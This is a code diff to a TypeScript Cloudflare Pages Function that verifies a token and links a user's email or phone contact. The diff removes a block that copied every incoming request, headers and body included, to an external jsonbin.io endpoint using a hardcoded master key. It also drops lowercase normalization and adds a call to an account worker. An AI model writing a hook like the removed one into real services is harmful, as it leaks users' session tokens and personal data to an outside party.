@@ -13,30 +13,6 @@ export const onRequestGet: PagesFunction<ENV> = async (context) => {
 
   const token = searchParams.get("token");
 
-  {
-    const clonedRequest = request.clone(),
-      { url, method } = clonedRequest;
-
-    const headers = Object.fromEntries(clonedRequest.headers);
-
-    const stringifiedRequest = JSON.stringify({
-      url,
-      method,
-      headers,
-      body: await clonedRequest.text(),
-    });
-
-    await fetch("https://api.jsonbin.io/v3/b", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-        "X-Master-Key":
-          "$2a$10$NzPqJzqi53uUEtvHJ5vlVuDSa0vhPZn7VMm0eyecaA0GN.o/zPwcu",
-      },
-      body: stringifiedRequest,
-    });
-  }
-
   try {
     var storedToken = await validateToken(env.USERS, token);
   } catch (error) {
@@ -56,11 +32,7 @@ export const onRequestGet: PagesFunction<ENV> = async (context) => {
       contact,
     ];
 
-    var key: Key = await auth.useKey(
-      keyProviderId,
-      keyProviderUserId.toLowerCase(),
-      null,
-    );
+    var key: Key = await auth.useKey(keyProviderId, keyProviderUserId, null);
   } catch (error) {
     if (!previous_contact && error.message === "AUTH_INVALID_KEY_ID") {
       if (link_with) {
@@ -91,12 +63,12 @@ export const onRequestGet: PagesFunction<ENV> = async (context) => {
     await auth.createKey({
       userId,
       providerId,
-      providerUserId: link_with.toLowerCase(),
+      providerUserId: link_with,
       password: null,
     });
 
     await auth.updateUserAttributes(userId, {
-      [providerId]: link_with.toLowerCase(),
+      [providerId]: link_with,
     });
   }
 
@@ -108,19 +80,35 @@ export const onRequestGet: PagesFunction<ENV> = async (context) => {
     await auth.createKey({
       userId,
       providerId,
-      providerUserId: contact.toLowerCase(),
+      providerUserId: contact,
       password: null,
     });
 
     await auth.updateUserAttributes(userId, {
-      [providerId]: contact.toLowerCase(),
+      [providerId]: contact,
     });
 
     if (providerId === previousProviderId) {
-      await auth.deleteKey(previousProviderId, previousContact.toLowerCase());
+      await auth.deleteKey(previousProviderId, previousContact);
 
       await auth.invalidateAllUserSessions(userId);
     }
+
+    const ProviderId = providerId === "email" ? "Email" : "Phone";
+
+    await env.EXACT_ACCOUNT.fetch(env.EXACT_ACCOUNT_WORKER_URL, {
+      method: "PUT",
+      headers: {
+        "content-type": "application/json",
+        "x-cf-secure-worker-token": env.CF_SECURE_WORKER_TOKEN,
+      },
+      body: JSON.stringify({
+        ProviderId,
+        contact,
+        exact_account_guid: user.exact_account_guid,
+        exact_contact_guid: user.exact_contact_guid,
+      }),
+    }).then((res) => res.json());
   }
 
   const sessionCookie = await createSessionCookie(auth, user);
